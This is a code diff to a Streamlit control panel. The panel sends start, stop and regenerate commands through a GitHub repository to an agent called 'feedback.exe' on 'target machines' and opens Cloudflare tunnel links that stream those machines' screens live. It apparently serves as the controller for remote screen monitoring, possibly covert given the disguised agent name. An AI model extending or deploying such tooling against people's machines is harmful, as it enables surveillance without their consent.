@@ -177,14 +177,15 @@ with st.sidebar:
         st.warning("No devices registered yet (live/ folder is empty).")
         st.stop()
 
-    # Build display labels:  "username  [abc12345]  ● online"
+    # Build display labels:  "username  [abc12345]  ● online  📡"
     # Short ID (first 8 chars) ensures devices with the same username are distinguishable.
     def _label(d: dict) -> str:
-        badge    = "● online" if d.get("online") else "○ offline"
+        online_badge  = "● online" if d.get("online") else "○ offline"
+        stream_badge  = "  📡" if d.get("streaming") else ""
         uid      = d.get("unique_id", "")
         short_id = uid[:8] if uid else "?"
         name     = d.get("username", uid) or uid
-        return f"{name}  [{short_id}]  {badge}"
+        return f"{name}  [{short_id}]  {online_badge}{stream_badge}"
 
     labels  = [_label(d) for d in devices]
     idx     = st.selectbox("Select device", range(len(labels)), format_func=lambda i: labels[i])
@@ -210,12 +211,14 @@ with st.sidebar:
 # ──────────────────────────────────────────────────────────────────
 # Main content
 # ──────────────────────────────────────────────────────────────────
+is_streaming = device.get("streaming", False)
 stream_url   = device.get("stream_url", "")
 snapshot_url = device.get("snapshot_url", "")
 status_url   = device.get("status_url", "")
+dir_name     = device.get("_dir_name", "")
 
-if not stream_url:
-    st.error("Device has no stream_url registered. Make sure feedback.exe is running on the target.")
+if not device.get("online"):
+    st.error("Device is offline. Make sure feedback.exe is running on the target machine.")
     st.stop()
 
 st.subheader(
@@ -224,70 +227,56 @@ st.subheader(
     f"—  `{device['unique_id']}`"
 )
 
-# Show direct URLs for convenience
-with st.expander("Direct stream URLs", expanded=False):
-    st.markdown(
-        f"| Endpoint | URL |\n"
-        f"|---|---|\n"
-        f"| 🎬 MJPEG stream | `{stream_url}` |\n"
-        f"| 📸 Single snapshot | `{snapshot_url}` |\n"
-        f"| ℹ️ Status JSON | `{status_url}` |"
-    )
-    st.markdown(
-        f"[Open stream in new tab]({stream_url})  ·  "
-        f"[Open snapshot]({snapshot_url})"
-    )
+# ── Streaming status banner ───────────────────────────────────────────────────────
+if is_streaming:
+    st.success("📡  **Streaming is active** — tunnel is live and ready to view.")
+else:
+    st.info("⏸  **Streaming is idle.** Click **▶ Start Stream** to activate the Cloudflare tunnel.")
 
-st.divider()
+# ── Stream control buttons ───────────────────────────────────────────────────────
+col_start, col_stop, col_regen = st.columns(3)
 
-# ── How to view ───────────────────────────────────────────────────
-st.markdown(
-    """
-    ### How to watch the live stream
+with col_start:
+    start_disabled = is_streaming
+    if st.button("▶  Start Stream", type="primary", use_container_width=True,
+                 disabled=start_disabled,
+                 help="Tell the agent to start cloudflared and register a new tunnel URL."):
+        if not dir_name:
+            st.error("Cannot determine device folder name.")
+        else:
+            with st.spinner("Sending start_stream command…"):
+                ok = _write_command(dir_name, token, "start_stream")
+            if ok:
+                st.success(
+                    "✅ Command sent! The agent will start the tunnel in ~15 s. "
+                    "Click **🔄 Refresh device list** in the sidebar to pick up the new URL."
+                )
+            else:
+                st.error("Failed to write command to GitHub. Check your token has write access.")
+    st.caption("Activate tunnel when you want to view")
 
-    1. Click **Watch in browser** below — the Cloudflare tunnel URL opens in a new tab.
-    2. **Cloudflare shows a one-time warning page** — click the button to proceed.
-       (This is normal for Quick Tunnels. It only happens once per browser session.)
-    3. The browser loads a built-in HTML viewer that **auto-starts the MJPEG stream**.
-    4. Done — you are watching the screen in real-time at ~2 FPS.
-
-    > The warning page appears because Cloudflare Quick Tunnels are intended for development.
-    > After clicking through once, the stream runs with ~0.5 s latency directly from the
-    > target machine — no intermediary storage.
-    """
-)
-
-col_watch, col_snap, col_status, col_regen = st.columns(4)
-
-with col_watch:
-    st.link_button(
-        "🎬  Watch in browser",
-        device.get("tunnel_url", stream_url),
-        use_container_width=True,
-        type="primary",
-    )
-    st.caption("Opens the built-in HTML viewer (best experience)")
-
-with col_snap:
-    st.link_button(
-        "📸  Single snapshot",
-        snapshot_url,
-        use_container_width=True,
-    )
-    st.caption("One JPEG frame — useful for a quick check")
-
-with col_status:
-    st.link_button(
-        "ℹ️  Status JSON",
-        status_url,
-        use_container_width=True,
-    )
-    st.caption("Device heartbeat & metadata")
+with col_stop:
+    stop_disabled = not is_streaming
+    if st.button("⏹  Stop Stream", use_container_width=True,
+                 disabled=stop_disabled,
+                 help="Tell the agent to shut down the cloudflared tunnel to save bandwidth."):
+        if not dir_name:
+            st.error("Cannot determine device folder name.")
+        else:
+            with st.spinner("Sending stop_stream command…"):
+                ok = _write_command(dir_name, token, "stop_stream")
+            if ok:
+                st.success(
+                    "✅ Command sent! The agent will stop the tunnel in ~15 s. "
+                    "Refresh the device list to confirm."
+                )
+            else:
+                st.error("Failed to write command to GitHub.")
+    st.caption("Stop tunnel to save bandwidth")
 
 with col_regen:
     if st.button("🔄  Regenerate tunnel", use_container_width=True,
-                 help="Ask the agent to kill the current Cloudflare tunnel and create a new one."):
-        dir_name = device.get("_dir_name", "")
+                 help="Kill the current broken tunnel and get a fresh URL."):
         if not dir_name:
             st.error("Cannot determine device folder name.")
         else:
@@ -296,11 +285,75 @@ with col_regen:
             if ok:
                 st.success(
                     "✅ Command sent! The agent will create a new tunnel within ~15 s. "
-                    "Click **Refresh device list** in the sidebar once done to get the new URL."
+                    "Click **🔄 Refresh device list** in the sidebar once done."
                 )
             else:
                 st.error("Failed to write command to GitHub. Check your token has write access.")
     st.caption("Use when the current tunnel is broken")
+
+st.divider()
+
+# ── Stream URLs + Watch buttons (only when streaming is active) ───────────────────
+if is_streaming and stream_url:
+    with st.expander("Direct stream URLs", expanded=False):
+        st.markdown(
+            f"| Endpoint | URL |\n"
+            f"|---|---|\n"
+            f"| 🎬 MJPEG stream | `{stream_url}` |\n"
+            f"| 📸 Single snapshot | `{snapshot_url}` |\n"
+            f"| ℹ️ Status JSON | `{status_url}` |"
+        )
+
+    st.markdown(
+        """
+        ### How to watch the live stream
+
+        1. Click **Watch in browser** below — the Cloudflare tunnel URL opens in a new tab.
+        2. **Cloudflare shows a one-time warning page** — click the button to proceed.
+        3. Enter the **access key** (Windows username of the device) when prompted.
+        4. Done — you are watching the screen in real-time at ~2 FPS.
+
+        > When finished, click **⏹ Stop Stream** to shut down the tunnel and save bandwidth.
+        """
+    )
+
+    col_watch, col_snap, col_status = st.columns(3)
+
+    with col_watch:
+        st.link_button(
+            "🎬  Watch in browser",
+            device.get("tunnel_url", stream_url),
+            use_container_width=True,
+            type="primary",
+        )
+        st.caption("Opens the built-in HTML viewer (best experience)")
+
+    with col_snap:
+        st.link_button(
+            "📸  Single snapshot",
+            snapshot_url,
+            use_container_width=True,
+        )
+        st.caption("One JPEG frame — useful for a quick check")
+
+    with col_status:
+        st.link_button(
+            "ℹ️  Status JSON",
+            status_url,
+            use_container_width=True,
+        )
+        st.caption("Device heartbeat & metadata")
+else:
+    st.markdown(
+        """
+        ### How to start viewing
+
+        1. Click **▶ Start Stream** above — the agent will activate the Cloudflare tunnel (~15 s).
+        2. Click **🔄 Refresh device list** in the sidebar to pick up the new tunnel URL.
+        3. Once the banner shows **Streaming is active**, click **Watch in browser**.
+        4. When done, click **⏹ Stop Stream** to save bandwidth.
+        """
+    )
 
 st.divider()
 
